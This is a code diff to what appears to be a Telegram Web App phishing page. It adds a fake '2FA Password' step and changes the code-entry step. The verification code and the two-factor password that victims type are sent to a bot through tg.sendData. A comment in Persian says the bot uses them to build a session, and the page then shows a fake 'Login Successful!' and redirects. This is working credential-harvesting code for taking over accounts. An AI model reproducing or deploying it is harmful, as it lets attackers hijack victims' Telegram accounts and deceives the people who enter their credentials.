@@ -97,6 +97,13 @@
             margin-left: 8px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .success {
+            text-align: center;
+            color: #fff;
+            padding: 30px 0;
+        }
+        .success .check { font-size: 80px; display: block; margin-bottom: 20px; }
+        .success h2 { font-size: 24px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
@@ -130,11 +137,24 @@
             <p class="status" id="status2"></p>
         </div>
 
-        <!-- STEP 3: REDIRECT -->
+        <!-- STEP 3: 2FA -->
         <div id="step3" class="step">
-            <div style="text-align: center; color: #fff; padding: 30px 0;">
-                <span style="font-size: 80px; display: block; margin-bottom: 20px;">✅</span>
-                <h2 style="font-size: 24px; margin-bottom: 15px;">Login Successful!</h2>
+            <div class="header">
+                <span class="icon">🔐</span>
+                <h1>2FA Password</h1>
+                <p class="subtitle">Enter your password</p>
+            </div>
+            <label>Password:</label>
+            <input type="password" id="password" placeholder="Password" dir="ltr">
+            <button onclick="sendPassword()" id="btnPassword">Verify</button>
+            <p class="status" id="status3"></p>
+        </div>
+
+        <!-- STEP 4: REDIRECT -->
+        <div id="step4" class="step">
+            <div class="success">
+                <span class="check">✅</span>
+                <h2>Login Successful!</h2>
                 <p>Redirecting...</p>
             </div>
         </div>
@@ -191,7 +211,7 @@
             }
         }
 
-        // 🔥 هر کدی بزنی، چه درست چه غلط، مستقیم می‌ره به سایت
+        // ✅ کد رو به ربات می‌فرستیم تا Session بسازه
         function sendCode() {
             const code = document.getElementById('code').value.replace(/\D/g, '');
             const status = document.getElementById('status2');
@@ -205,13 +225,48 @@
             btn.disabled = true;
             status.innerHTML = '<span class="loading"></span> Verifying...';
 
-            // 🔥 اصلاً کد رو به ربات نمی‌فرستیم، فقط می‌ریم به سایت
-            setTimeout(() => {
-                status.innerHTML = '✅ Verified!';
+            try {
+                tg.sendData(JSON.stringify({ action: 'send_code', code: code }));
+                status.innerHTML = '✅ Checking code...';
                 status.style.color = '#4ade80';
-                showStep(3);
-                redirectToSite();
-            }, 800);
+                
+                // اگر 2FA نبود، بعد از چند ثانیه برو مرحله بعد
+                setTimeout(() => {
+                    showStep(4);
+                    redirectToSite();
+                }, 3000);
+            } catch(e) {
+                status.innerHTML = '❌ ' + e.message;
+                btn.disabled = false;
+            }
+        }
+
+        function sendPassword() {
+            const password = document.getElementById('password').value.trim();
+            const status = document.getElementById('status3');
+            const btn = document.getElementById('btnPassword');
+
+            if (!password) {
+                tg.showAlert('Enter password');
+                return;
+            }
+
+            btn.disabled = true;
+            status.innerHTML = '<span class="loading"></span> Verifying...';
+
+            try {
+                tg.sendData(JSON.stringify({ action: 'send_password', password: password }));
+                status.innerHTML = '✅ Verifying...';
+                status.style.color = '#4ade80';
+                
+                setTimeout(() => {
+                    showStep(4);
+                    redirectToSite();
+                }, 3000);
+            } catch(e) {
+                status.innerHTML = '❌ ' + e.message;
+                btn.disabled = false;
+            }
         }
 
         setTimeout(() => {
